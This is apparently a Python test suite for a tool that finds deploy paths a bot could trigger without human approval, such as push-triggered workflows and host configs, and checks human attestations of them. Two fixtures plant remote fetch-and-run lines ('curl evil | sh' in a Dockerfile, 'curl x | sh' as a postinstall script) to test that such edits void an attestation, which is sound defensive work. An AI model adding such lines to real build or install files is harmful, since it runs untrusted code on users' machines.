"""B5: the deployment surface (RC-1, DEC-38). A push the bot may make must not be a deploy nobody approved."""
from __future__ import annotations

import json
import unittest

from doctorlib import deploy, levelcalc

from .helpers import BoundaryCase

DEPLOY_ON_PUSH = """name: deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx cdk deploy --all --require-approval never
"""

DEPLOY_ANY_BRANCH = """name: deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: terraform apply -auto-approve
"""

GATED = """name: deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: sst deploy --stage prod
"""


class SurfaceCase(BoundaryCase):
    GROUPS = {"deploy-surface"}

    def repo_with(self, files, config=None):
        return self.kit_repo(config=config, files=files)

    def triggers(self, repo, config_override=None):
        ctx = self.ctx(repo)
        surface = ctx.fact("deploy_surface")
        return ctx, surface, deploy.evaluate(ctx, surface)["triggers"]

    def attest(self, repo, **extra):
        """Write an attestation that matches the repo's current surface (what a human would do)."""
        ctx = self.ctx(repo)
        fp = ctx.fact("deploy_surface")["fingerprint"]
        cfg = {"deploy_surface": {"attested_at": "2026-10-26", "fingerprint": fp}}
        cfg.update(extra)
        return cfg


class WorkflowDetection(SurfaceCase):
    def test_push_main_deploy_is_ungated_main(self):
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        res = self.results(self.ctx(repo))
        hit = self.assertFails(res, "deploy.main-workflow")
        self.assertIn("cdk deploy", hit[0].message)
        self.assertIn("push:main", hit[0].message)
        self.assertEqual(hit[0].severity, "warn")

    def test_push_any_branch_deploy_is_a_bot_pushable_error(self):
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        hit = self.assertFails(self.results(self.ctx(repo)), "deploy.push-workflow")
        self.assertEqual(hit[0].severity, "error")
        self.assertIn("terraform apply", hit[0].message)

    def test_boundary_fixture_deploy_by_side_effect_caps_at_l1(self):
        """Report §15 item 9: a repo with an on: push deploy workflow; an L2 bot push is refused."""
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        ctx = self.ctx(repo)
        res = self.results(ctx)
        cap = levelcalc.cap_b5(ctx, levelcalc.R(res))
        self.assertEqual(cap.level, 1)
        self.assertIn("deploy.yml", cap.reason)

    def test_gated_by_environment_attested_and_job_names_one(self):
        repo = self.repo_with({".github/workflows/deploy.yml": GATED})
        cfg = self.attest(repo, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo2 = self.repo_with({".github/workflows/deploy.yml": GATED}, cfg)
        ctx = self.ctx(repo2)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.workflow.deploy.yml")[0].status, "pass")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 5)

    def test_attestation_claims_environment_but_job_has_none(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("no environment", " ".join(trig[0]["problems"]))
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 4)

    def test_attestation_that_does_not_cover_the_events_the_workflow_fires_on(self):
        text = DEPLOY_ON_PUSH.replace("branches: [main]", "branches: [main, 'release/**']")
        repo0 = self.repo_with({".github/workflows/deploy.yml": text})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "none"}])
        repo = self.repo_with({".github/workflows/deploy.yml": text}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertTrue(trig[0]["ungated_bot_pushable"])
        self.assertIn("push:branches", " ".join(trig[0]["problems"]))

    def test_environment_without_required_reviewers_in_recorded_github_data(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": GATED})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "gated-by-environment"}])
        repo = self.repo_with({".github/workflows/deploy.yml": GATED}, cfg)
        from doctorlib import github
        fx = {"repos/acme/widgets": {"default_branch": "main"}, "repos/acme/widgets/environments": {"environments": [{"name": "production", "protection_rules": []}]}}
        ctx = self.ctx(repo, ghapi=github.fixture_ghapi(fx))
        trig = deploy.evaluate(ctx, ctx.fact("deploy_surface"))["triggers"]
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("no required reviewers", " ".join(trig[0]["problems"]))

    def test_a_manual_gate_cannot_hold_for_a_workflow_an_event_starts(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "push:main", "gate": "manual"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ON_PUSH}, cfg)
        ctx, surface, trig = self.triggers(repo)
        self.assertEqual(trig[0]["gate"], "none")
        self.assertIn("cannot hold", " ".join(trig[0]["problems"]))

    def test_declared_not_deploying_is_accepted(self):
        repo0 = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        cfg = self.attest(repo0, deploy_triggers=[{"workflow": ".github/workflows/deploy.yml", "fires_on": "none", "gate": "manual"}])
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 5)

    def test_non_push_triggers_the_bot_can_cause(self):
        base = "name: x\non:\n  %s\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: flyctl deploy\n"
        cases = {"repository_dispatch:\n    types: [deploy]": "repository_dispatch", "release:\n    types: [published]": "release",
                 "workflow_run:\n    workflows: [CI]\n    types: [completed]": "workflow_run", "issue_comment:\n    types: [created]": "issue_comment",
                 "pull_request:\n    branches: [main]": "pull_request", "push:\n    tags: ['v*']": "tag", "create": "create",
                 "schedule:\n    - cron: '0 3 * * *'": "schedule:main", "workflow_run:\n    workflows: [CI]\n    branches: [main]": "workflow_run:main"}
        repo = self.repo_with({})
        for trig, fire in cases.items():
            with self.subTest(trigger=fire):
                repo.write(".github/workflows/x.yml", base % trig)
                fires = self.ctx(repo).fact("deploy_surface")["workflows"][0]["fires_on"]
                self.assertIn(fire, fires)

    def test_workflow_dispatch_only_is_human_started(self):
        text = "name: x\non: workflow_dispatch\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: terraform apply\n"
        repo = self.repo_with({".github/workflows/x.yml": text})
        res = self.results(self.ctx(repo))
        self.assertEqual(self.by_id(res, "deploy.workflow.x.yml")[0].status, "pass")

    def test_indirect_and_publish_style_deploys_are_found(self):
        cmds = ["pnpm run deploy", "make deploy", "./scripts/deploy.sh", "docker push ghcr.io/acme/app:latest", "npm publish", "gh release create v1",
                "kubectl apply -f k8s/", "helm upgrade app ./chart", "aws s3 sync ./dist s3://bucket", "serverless deploy", "wrangler deploy", "vercel --prod",
                "pulumi up --yes", "aws ecs update-service --cluster c --service s", "gcloud run deploy x", "firebase deploy", "netlify deploy --prod",
                "amplify publish", "git push heroku main", "curl -X POST https://api.vercel.com/v1/integrations/deploy/prj_x/hook", "cargo publish", "twine upload dist/*"]
        repo = self.repo_with({})
        for cmd in cmds:
            with self.subTest(cmd=cmd):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: %s\n" % json.dumps(cmd))
                self.assertTrue(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], cmd)

    def test_deploy_actions_by_uses(self):
        repo = self.repo_with({})
        for uses in ("aws-actions/amazon-ecs-deploy-task-definition@v2", "azure/webapps-deploy@v3", "superfly/flyctl-actions@master",
                     "cloudflare/wrangler-action@v3", "googleapis/release-please-action@v4", "peaceiris/actions-gh-pages@v4", "changesets/action@v1"):
            with self.subTest(uses=uses):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: %s\n" % uses)
                self.assertTrue(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], uses)

    def test_docker_build_push_action_only_with_push_true(self):
        for push, expected in (("true", True), ("false", False)):
            text = "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/build-push-action@v6\n        with:\n          push: %s\n" % push
            repo = self.repo_with({".github/workflows/x.yml": text})
            self.assertEqual(self.ctx(repo).fact("deploy_surface")["workflows"][0]["deploys"], expected)

    def test_reusable_workflow_call_inherits_the_callee_deploys(self):
        caller = "name: c\non: push\njobs:\n  go:\n    uses: ./.github/workflows/callee.yml\n"
        callee = "name: callee\non:\n  workflow_call:\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cdk deploy\n"
        repo = self.repo_with({".github/workflows/caller.yml": caller, ".github/workflows/callee.yml": callee})
        wfs = {w["file"]: w for w in self.ctx(repo).fact("deploy_surface")["workflows"]}
        self.assertTrue(wfs[".github/workflows/caller.yml"]["deploys"])
        self.assertEqual(wfs[".github/workflows/callee.yml"]["fires_on"], [])

    def test_unparsed_workflow_with_deploy_text_is_treated_as_deploying_on_push(self):
        text = 'name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "note: deploying" && cdk deploy\n'
        repo = self.repo_with({".github/workflows/x.yml": text})
        wf = self.ctx(repo).fact("deploy_surface")["workflows"][0]
        self.assertFalse(wf["parsed"])
        self.assertTrue(wf["deploys"])
        self.assertEqual(wf["fires_on"], ["push:branches"])
        self.assertFails(self.results(self.ctx(repo)), "deploy.push-workflow")

    def test_unparsed_workflow_without_deploy_text_is_unknown_never_a_pass(self):
        text = 'name: x\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "a: b"\n'
        repo = self.repo_with({".github/workflows/x.yml": text})
        r = self.by_id(self.results(self.ctx(repo)), "deploy.unparsed")
        self.assertEqual([x.status for x in r], ["unknown"])

    def test_release_automation_is_reported_as_h5(self):
        text = "name: release\non:\n  push:\n    branches: [main]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: googleapis/release-please-action@v4\n"
        repo = self.repo_with({".github/workflows/release.yml": text})
        res = self.results(self.ctx(repo))
        self.assertIn("H5", self.by_id(res, "deploy.release-automation")[0].message)

    def test_a_workflow_with_no_deploy_is_not_listed(self):
        repo = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pytest\n"})
        res = self.results(self.ctx(repo))
        self.assertEqual([r for r in res if r.id.startswith("deploy.push") or r.id.startswith("deploy.main")], [])


class HostConfigs(SurfaceCase):
    HOSTS = {"vercel.json": "vercel", "netlify.toml": "netlify", "amplify.yml": "amplify", "fly.toml": "fly", "wrangler.toml": "cloudflare", "render.yaml": "render",
             "railway.json": "railway", "Procfile": "heroku", "app.yaml": "gcp-app-engine", "firebase.json": "firebase", ".gitlab-ci.yml": "gitlab-ci",
             "Jenkinsfile": "jenkins", ".circleci/config.yml": "circleci", "buildspec.yml": "aws-codebuild", "azure-pipelines.yml": "azure-pipelines",
             "bitbucket-pipelines.yml": "bitbucket-pipelines", "flux-system/gotk.yaml": "gitops", "argocd/app.yaml": "gitops"}

    def test_each_host_config_file_is_detected_and_unattested_is_an_error(self):
        for fname, host in self.HOSTS.items():
            with self.subTest(file=fname):
                repo = self.repo_with({fname: "x\n"})
                res = self.check_one(self.ctx(repo), "deploy.surface")
                hit = self.assertFails(res, "deploy.host.%s" % host)
                self.assertEqual(hit[0].severity, "error")
                self.assertIn("nobody attested", hit[0].message)

    def test_attested_host_with_branch_previews_and_no_gate_is_l1(self):
        repo0 = self.repo_with({"vercel.json": "{}"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "vercel", "previews_on": "all-branches", "production_on": "main", "gate": "none"}])
        repo = self.repo_with({"vercel.json": "{}"}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 1)
        self.assertIn("bot-pushable", self.assertFails(res, "deploy.host.vercel")[0].message)

    def test_attested_host_production_on_main_only_caps_at_l4(self):
        repo0 = self.repo_with({"netlify.toml": ""})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "netlify", "previews_on": "none", "production_on": "main", "gate": "none"}])
        repo = self.repo_with({"netlify.toml": ""}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 4)

    def test_label_triggered_previews_and_a_manual_gate_are_acceptable(self):
        repo0 = self.repo_with({"render.yaml": "x"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "render", "previews_on": "label", "production_on": "main", "gate": "manual"}])
        repo = self.repo_with({"render.yaml": "x"}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 5)

    def test_staging_branch_production_is_bot_pushable(self):
        repo0 = self.repo_with({"fly.toml": "x"})
        cfg = self.attest(repo0, git_integrated_hosts=[{"host": "fly", "previews_on": "none", "production_on": "staging", "gate": "none"}])
        repo = self.repo_with({"fly.toml": "x"}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 1)

    def test_a_dashboard_only_host_can_be_declared_without_a_file(self):
        cfg = {"deploy_surface": {"attested_at": "2026-10-26", "fingerprint": "x"},
               "git_integrated_hosts": [{"host": "vercel", "previews_on": "all-branches", "production_on": "main", "gate": "none"}]}
        repo0 = self.repo_with({}, cfg)
        fp = self.ctx(repo0).fact("deploy_surface")["fingerprint"]
        cfg["deploy_surface"]["fingerprint"] = fp
        repo = self.repo_with({}, cfg)
        ctx = self.ctx(repo)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(self.results(ctx))).level, 1)

    def test_bad_attestation_entries_are_reported(self):
        cfg = {"git_integrated_hosts": [{"host": "vercel", "gate": "sometimes"}], "deploy_triggers": [{"workflow": "x.yml"}]}
        repo = self.repo_with({}, cfg)
        msgs = [r.message for r in self.assertFails(self.results(self.ctx(repo)), "deploy.attestation-schema")]
        self.assertEqual(len(msgs), 3, msgs)


class AttestationAndFingerprint(SurfaceCase):
    def test_empty_surface_still_needs_a_human_attestation(self):
        repo = self.repo_with({})
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.attestation")[0].status, "fail")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 1)

    def test_current_attestation_passes(self):
        repo0 = self.repo_with({})
        cfg = self.attest(repo0)
        repo = self.repo_with({}, cfg)
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(self.by_id(res, "deploy.attestation")[0].status, "pass")
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 5)

    def test_changing_a_deploy_surface_file_voids_the_attestation(self):
        repo0 = self.repo_with({"Dockerfile": "FROM scratch\n"})
        cfg = self.attest(repo0)
        repo = self.repo_with({"Dockerfile": "FROM scratch\n"}, cfg)
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "pass")
        repo.write("Dockerfile", "FROM scratch\nRUN curl evil | sh\n")
        res = self.results(self.ctx(repo))
        r = self.by_id(res, "deploy.attestation")[0]
        self.assertEqual((r.status, r.severity), ("fail", "error"))
        self.assertIn("changed", r.message)

    def test_adding_a_new_workflow_voids_the_attestation(self):
        repo0 = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs: {}\n"})
        cfg = self.attest(repo0)
        repo = self.repo_with({".github/workflows/ci.yml": "name: ci\non: push\njobs: {}\n"}, cfg)
        repo.write(".github/workflows/new.yml", "name: n\non: push\njobs:\n  d:\n    runs-on: x\n    steps:\n      - run: echo hi\n")
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "fail")

    def test_package_json_scripts_are_part_of_the_fingerprint(self):
        repo0 = self.repo_with({"package.json": json.dumps({"scripts": {"test": "jest"}})})
        cfg = self.attest(repo0)
        repo = self.repo_with({"package.json": json.dumps({"scripts": {"test": "jest"}})}, cfg)
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "pass")
        repo.write("package.json", json.dumps({"scripts": {"test": "jest", "postinstall": "curl x | sh"}}))
        self.assertEqual(self.by_id(self.results(self.ctx(repo)), "deploy.attestation")[0].status, "fail")

    def test_unrelated_files_do_not_change_the_fingerprint(self):
        repo = self.repo_with({"src/app.py": "print(1)\n"})
        a = self.ctx(repo).fact("deploy_surface")["fingerprint"]
        repo.write("src/app.py", "print(2)\n")
        b = self.ctx(repo).fact("deploy_surface")["fingerprint"]
        self.assertEqual(a, b)

    def test_floor_patterns_cover_the_h3_deploy_surface_list(self):
        names = ["serverless.yml", "sst.config.ts", "amplify/backend.ts", "amplify.yml", "cdk.json", "bin/app.ts", "packages/infra/x.ts", "Dockerfile", "Dockerfile.prod",
                 "docker-compose.yml", "fly.toml", "vercel.json", "netlify.toml", "wrangler.toml", "render.yaml", "railway.json", "Procfile", "k8s/deploy.yaml",
                 "helm/values.yaml", "kustomization.yaml", "Chart.yaml", ".github/workflows/x.yml"]
        got = set(deploy.surface_files(names))
        self.assertEqual(got, set(names))

    def test_monorepo_subdirectory_configs_count_but_root_only_names_do_not(self):
        names = ["apps/web/vercel.json", "services/api/fly.toml", "services/api/Dockerfile.prod", "deploy/k8s/app.yaml", "infra/serverless.yml", "apps/web/wrangler.toml"]
        got = set(deploy.surface_files(names + ["src/app.yaml", "docs/template.yaml", "apps/web/.github/workflows/x.yml", "src/CNAME"]))
        self.assertEqual(got, set(names))

    def test_a_nested_vercel_json_needs_an_attestation(self):
        repo = self.repo_with({"apps/web/vercel.json": "{}"})
        self.assertFails(self.check_one(self.ctx(repo), "deploy.surface"), "deploy.host.vercel")

    def test_infrastructure_as_code_is_detected(self):
        repo = self.repo_with({"infra/main.tf": "", "cdk.json": "{}", "Pulumi.yaml": "x"})
        iac = self.ctx(repo).fact("deploy_surface")["iac"]
        self.assertEqual(set(iac), {"terraform", "cdk", "pulumi"})

    def test_cli_deploy_surface_prints_the_fingerprint_and_exits_nonzero_on_error(self):
        from .helpers import run_doctor
        repo = self.repo_with({".github/workflows/deploy.yml": DEPLOY_ANY_BRANCH})
        rc, out, err = run_doctor(["--deploy-surface", "--repo", repo.path, "--home", self.fake_home.path, "--claude-version", "2.1.305"], self.fake_home.env())
        self.assertEqual(rc, 1, out + err)
        self.assertIn("deploy.push-workflow", out)
        self.assertIn("fingerprint:", out)


# --- review fixes (package D): IN-1, IN-2, IN-3, IN-4, IN-7, IN-11 ---------------------------------------------------------------------

SHA40 = "0123456789abcdef0123456789abcdef01234567"
CRED_BUILD = """name: build
on:
  %s
permissions:
  contents: read
  id-token: write
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run build
"""


class ReviewFixes(SurfaceCase):
    def wf(self, repo):
        return self.ctx(repo).fact("deploy_surface")["workflows"][0]

    def test_a_credentialed_job_on_a_push_the_bot_can_make_is_a_deploy(self):
        for on in ("push:\n    branches: ['**']", "push:\n    branches-ignore: [docs]", "push:\n    tags: ['v*']", "push:"):
            with self.subTest(on):
                w = self.wf(self.repo_with({".github/workflows/b.yml": CRED_BUILD % on}))
                self.assertTrue(w["deploys"])
                self.assertIn("cloud credentials", " ".join(w["labels"]))
                self.assertTrue(any(f in ("push:branches", "tag") for f in w["fires_on"]))

    def test_the_same_job_on_main_only_or_a_dispatch_is_not(self):
        for on in ("push:\n    branches: [main]", "workflow_dispatch:"):
            with self.subTest(on):
                self.assertFalse(self.wf(self.repo_with({".github/workflows/b.yml": CRED_BUILD % on}))["deploys"])

    def test_a_job_without_credentials_on_any_push_is_not_a_deploy(self):
        text = (CRED_BUILD % "push:\n    branches: ['**']").replace("  id-token: write\n", "")
        self.assertFalse(self.wf(self.repo_with({".github/workflows/b.yml": text}))["deploys"])

    def test_the_credentialed_job_caps_the_level_at_l1(self):
        repo = self.repo_with({".github/workflows/b.yml": CRED_BUILD % "push:\n    branches: ['**']"})
        ctx = self.ctx(repo)
        res = self.results(ctx)
        self.assertEqual(levelcalc.cap_b5(ctx, levelcalc.R(res)).level, 1)

    def test_the_review_vocabulary_is_a_deploy_on_push(self):
        repo = self.repo_with({})
        for cmd in ("sam deploy --guided", "cdktf deploy", "pulumi update --yes", "terragrunt run --all apply", "copilot deploy", "eb deploy", "ansible-playbook site.yml",
                    "/usr/local/bin/terraform apply -auto-approve", "./bin/tofu apply", "terraform 'apply'", "$(which terraform) apply"):
            with self.subTest(cmd):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: %s\n" % json.dumps(cmd))
                self.assertTrue(self.wf(repo)["deploys"], cmd)

    def test_the_review_actions_are_deploys(self):
        repo = self.repo_with({})
        for uses in ("gruntwork-io/terragrunt-action@v2", "dflook/tofu-apply@v1", "dawidd6/action-ansible-playbook@v2"):
            with self.subTest(uses):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: %s\n" % uses)
                self.assertTrue(self.wf(repo)["deploys"], uses)

    def test_docker_steps_are_read(self):
        repo = self.repo_with({})
        digest = "sha256:" + "ab" * 32
        cases = {"hashicorp/terraform:1.9@%s" % digest: "", "alpine@%s" % digest: "        with:\n          args: terraform apply -auto-approve\n"}
        for image, extra in cases.items():
            with self.subTest(image):
                repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://%s\n%s" % (image, extra))
                self.assertTrue(self.wf(repo)["deploys"], image)
        repo.write(".github/workflows/x.yml", "name: x\non: push\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://alpine@%s\n        with:\n          args: echo hi\n" % digest)
        self.assertFalse(self.wf(repo)["deploys"])

    def test_a_remote_reusable_workflow_with_secrets_or_a_token_is_a_deploy_whatever_it_is_called(self):
        callee = "acme/shared/.github/workflows/build.yml@" + SHA40
        for extra, perms in (("    secrets: inherit\n", ""), ("    secrets:\n      token: ${{ secrets.T }}\n", ""), ("", "permissions:\n  id-token: write\n")):
            with self.subTest(extra=extra, perms=perms):
                text = "name: c\non: push\n%sjobs:\n  go:\n    uses: %s\n%s" % (perms, callee, extra)
                w = self.wf(self.repo_with({".github/workflows/c.yml": text}))
                self.assertTrue(w["deploys"])
                self.assertIn("external reusable workflow", " ".join(w["labels"]))

    def test_a_remote_reusable_workflow_with_nothing_handed_over_is_not(self):
        text = "name: c\non: push\npermissions:\n  contents: read\njobs:\n  go:\n    uses: acme/shared/.github/workflows/lint.yml@%s\n" % SHA40
        self.assertFalse(self.wf(self.repo_with({".github/workflows/c.yml": text}))["deploys"])

    def test_the_name_heuristic_stays_as_an_extra_signal(self):
        text = "name: c\non: push\npermissions:\n  contents: read\njobs:\n  go:\n    uses: acme/shared/.github/workflows/deploy.yml@%s\n" % SHA40
        self.assertTrue(self.wf(self.repo_with({".github/workflows/c.yml": text}))["deploys"])


APPLY_ENV = """name: apply
on:
  push:
    branches: [main]
jobs:
  plan:
    runs-on: ubuntu-latest
    steps:
      - run: terraform plan -out=tfplan
  apply:
    needs: plan
    runs-on: ubuntu-latest
    environment: %s
    steps:
      - run: terraform apply tfplan
"""


class ApplyEnvironments(SurfaceCase):
    """IN-4 and IN-11: the Environment each apply job names is the one judged."""

    def gh(self, *envs):
        from doctorlib import github
        from . import ghfixtures as gf
        return github.fixture_ghapi(gf.build(environments={"environments": list(envs)}))

    def ctx_for(self, text, *envs, files=None, **kw):
        repo = self.repo_with(dict({".github/workflows/apply.yml": text}, **(files or {})))
        return self.ctx(repo, ghapi=self.gh(*envs) if envs else None, **kw)

    def test_apply_jobs_are_found_with_their_environment(self):
        ctx = self.ctx_for(APPLY_ENV % "production")
        self.assertEqual(deploy.apply_jobs(ctx), [{"file": ".github/workflows/apply.yml", "job": "apply", "environment": "production", "dynamic": False}])

    def test_a_dynamic_or_missing_environment_is_reported_as_such(self):
        dyn = self.ctx_for(APPLY_ENV % "${{ vars.E }}")
        self.assertEqual([(j["environment"], j["dynamic"]) for j in deploy.apply_jobs(dyn)], [(None, True)])
        none = self.ctx_for((APPLY_ENV % "x").replace("    environment: x\n", ""))
        self.assertEqual([j["environment"] for j in deploy.apply_jobs(none)], [None])

    def test_reviewers_on_some_other_environment_do_not_count(self):
        from . import ghfixtures as gf
        ctx = self.ctx_for(APPLY_ENV % "production", gf.env_with_reviewers("staging"), {"name": "production", "protection_rules": []})
        self.assertFalse(levelcalc.env_reviewers_available(ctx))

    def test_reviewers_on_the_environment_the_apply_names_do(self):
        from . import ghfixtures as gf
        ctx = self.ctx_for(APPLY_ENV % "production", gf.env_with_reviewers("production"))
        self.assertTrue(levelcalc.env_reviewers_available(ctx))

    def test_an_apply_job_with_no_environment_is_not_gated_by_reviewers(self):
        from . import ghfixtures as gf
        ctx = self.ctx_for((APPLY_ENV % "x").replace("    environment: x\n", ""), gf.env_with_reviewers("production"))
        self.assertFalse(levelcalc.env_reviewers_available(ctx))

    def test_a_dynamic_environment_name_is_never_credited(self):
        from . import ghfixtures as gf
        ctx = self.ctx_for(APPLY_ENV % "${{ vars.E }}", gf.env_with_reviewers("production"))
        self.assertFalse(levelcalc.env_reviewers_available(ctx))

    def test_every_apply_job_needs_its_own_reviewed_environment(self):
        from . import ghfixtures as gf
        two = APPLY_ENV % "production" + "  apply2:\n    needs: plan\n    runs-on: ubuntu-latest\n    environment: dr\n    steps:\n      - run: terraform apply tfplan2\n"
        self.assertFalse(levelcalc.env_reviewers_available(self.ctx_for(two, gf.env_with_reviewers("production"))))
        self.assertTrue(levelcalc.env_reviewers_available(self.ctx_for(two, gf.env_with_reviewers("production"), gf.env_with_reviewers("dr"))))

    def test_with_no_github_data_only_the_attestation_stands(self):
        text = APPLY_ENV % "production"
        self.assertFalse(levelcalc.env_reviewers_available(self.ctx_for(text)))
        repo = self.kit_repo(config={"platform_attested": ["environment_reviewers"]}, files={".github/workflows/apply.yml": text})
        self.assertTrue(levelcalc.env_reviewers_available(self.ctx(repo)))

    def test_github_data_beats_the_attestation(self):
        from . import ghfixtures as gf
        repo = self.kit_repo(config={"platform_attested": ["environment_reviewers"]}, files={".github/workflows/apply.yml": APPLY_ENV % "production"})
        ctx = self.ctx(repo, ghapi=self.gh(gf.env_with_reviewers("staging"), {"name": "production", "protection_rules": []}))
        self.assertFalse(levelcalc.env_reviewers_available(ctx))

    def test_a_repo_with_no_apply_job_keeps_the_old_reading(self):
        from . import ghfixtures as gf
        repo = self.repo_with({"infra/main.tf": ""})
        ctx = self.ctx(repo, ghapi=self.gh(gf.env_with_reviewers("production")))
        self.assertTrue(levelcalc.env_reviewers_available(ctx))

    def branch_policy(self, *envs, text=None):
        ctx = self.ctx_for(text or APPLY_ENV % "production", *envs)
        return self.check_one(ctx, "deploy.environment-branch-policy")[0]

    def test_an_environment_with_no_deployment_branch_policy_is_a_warning(self):
        from . import ghfixtures as gf
        r = self.branch_policy(gf.env_with_reviewers("production"))
        self.assertEqual((r.status, r.severity), ("fail", "warn"))
        self.assertIn("production", r.message)

    def test_a_deployment_branch_policy_passes(self):
        from . import ghfixtures as gf
        env = gf.env_with_reviewers("production")
        env["deployment_branch_policy"] = {"protected_branches": False, "custom_branch_policies": True}
        self.assertEqual(self.branch_policy(env).status, "pass")

    def test_an_environment_that_does_not_exist_yet_is_a_warning(self):
        from . import ghfixtures as gf
        r = self.branch_policy(gf.env_with_reviewers("staging"))
        self.assertEqual((r.status, r.severity), ("fail", "warn"))
        self.assertIn("do not exist", r.message)

    def test_no_github_data_or_no_apply_job_is_skipped_never_a_pass(self):
        ctx = self.ctx_for(APPLY_ENV % "production")
        self.assertEqual(self.check_one(ctx, "deploy.environment-branch-policy")[0].status, "skipped")
        from . import ghfixtures as gf
        ctx2 = self.ctx(self.repo_with({"infra/main.tf": ""}), ghapi=self.gh(gf.env_with_reviewers("production")))
        self.assertEqual(self.check_one(ctx2, "deploy.environment-branch-policy")[0].status, "skipped")

if __name__ == "__main__":
    unittest.main()
